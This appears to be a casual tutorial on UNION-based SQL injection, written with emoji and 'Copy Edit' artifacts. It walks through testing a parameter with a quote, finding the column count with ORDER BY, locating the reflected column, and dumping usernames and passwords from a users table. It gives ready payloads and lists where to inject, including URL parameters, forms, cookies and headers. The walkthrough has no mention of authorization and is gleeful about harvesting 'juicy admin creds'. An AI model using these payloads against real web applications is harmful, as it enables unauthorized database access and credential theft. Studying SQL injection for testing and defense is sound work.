🧠 Union SQLi — Core Breakdown
🔹 What is UNION?
UNION lets you combine results from two SELECT statements — basically appending rows from another query into the current result set.

sql
Copy
Edit
SELECT * FROM ports
UNION
SELECT * FROM ships;
✅ Same number of columns

✅ Matching data types

💣 When Union Gets Exploit-y
Let’s say the backend query is:

sql
Copy
Edit
SELECT name, price FROM products WHERE id='user_input'
If it’s injectable, you can sneak in:

sql
Copy
Edit
' UNION SELECT username, password FROM users-- 
🧨 Boom — you’re pulling creds into the UI like it’s just part of the original product query.

🔢 What If You Don't Know Column Count?
Start testing with:

sql
Copy
Edit
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
...
Once you get an error like:

sql
Copy
Edit
Unknown column '5' in 'order clause'
💡 You now know the number of columns is 4.

🧪 Column Discovery Technique (with junk data)
Try:

sql
Copy
Edit
' UNION SELECT 1,2,3,4-- 
If it reflects back 2, you now know:

Column count: ✅ 4

Output location: ✅ 2nd column

Later, inject:

sql
Copy
Edit
' UNION SELECT null, username, password, null FROM users-- 
🧠 Mindset Flowchart for Union SQLi
Check for SQLi: '

Column Count: ' ORDER BY 1--, ' ORDER BY 2-- etc.

Test Columns: ' UNION SELECT 1,2,3--

Identify Output Column

Extract Data: Replace the number with real column like username

🧠 This Is a Core Step in UNION SQLi:
✅ Use ' to test for injection

✅ Use ORDER BY to find column count

✅ Use UNION SELECT with that same number of columns

🔍 Inject junk values like 1,2 to test reflection

💥 Swap in username,password or other goodies once confirmed

✅ Recap: What ORDER BY Tests Are For
You use:

pgsql
Copy
Edit
?id=1' ORDER BY 1-- 
?id=1' ORDER BY 2-- 
?id=1' ORDER BY 3-- 
to figure out how many columns the original query is selecting — so that you can build a valid UNION SELECT payload that won’t throw an error.

🧠 So Where in a Web App Would You Use This?
✳️ You do NOT need credentials first. You can use this wherever there’s a dynamic parameter hitting the DB.
Typical examples:

Web App Feature	URL Example	What to Test
Product pages	/product.php?id=1	Test ?id=1' ORDER BY 1--
News articles	/news?id=4	Test ?id=4' ORDER BY 1--
Search forms (POST or GET)	search.php?q=abc	Use ' to trigger errors
Filtered lists	?category=2	Try SQLi there too
You’re usually hunting in:

URLs with parameters (GET)

Form submissions (POST)

Cookies (sometimes!)

Headers (advanced, but doable)

📌 So What's the Flow?
Here's a full example workflow:

🛒 Say the URL is:
bash
Copy
Edit
http://target.site/products.php?id=1
Step 1: Test for injection
Try:

bash
Copy
Edit
?id=1'
and get a SQL error? That’s 🔥

Step 2: Use ORDER BY to find column count
pgsql
Copy
Edit
?id=1' ORDER BY 1--     ✅
?id=1' ORDER BY 2--     ✅
?id=1' ORDER BY 3--     ❌ <-- error here
→ Now you know there are 2 columns

Step 3: Test UNION SELECT
bash
Copy
Edit
?id=1' UNION SELECT 1,2-- 
→ If 1 or 2 shows on the page, you know which column reflects output.

Step 4: Dump real data
Now you try:

bash
Copy
Edit
?id=1' UNION SELECT username,password FROM users-- 
And that’s when you see those juicy admin creds 👀

💡 TL;DR:
WHERE: Any dynamic parameter (URL, form, etc.)

WHEN: As soon as you see signs of SQL injection (errors, weird behavior)

WHY: To build a working UNION SELECT that matches the backend query shape

🛠️ TL;DR
1, 2, 3 help you find where output lands.

You replace those with real column names after you enumerate or guess them.

Reflection doesn’t mean “this is password” — it means “this is the slot we can use to print password if we know it.”
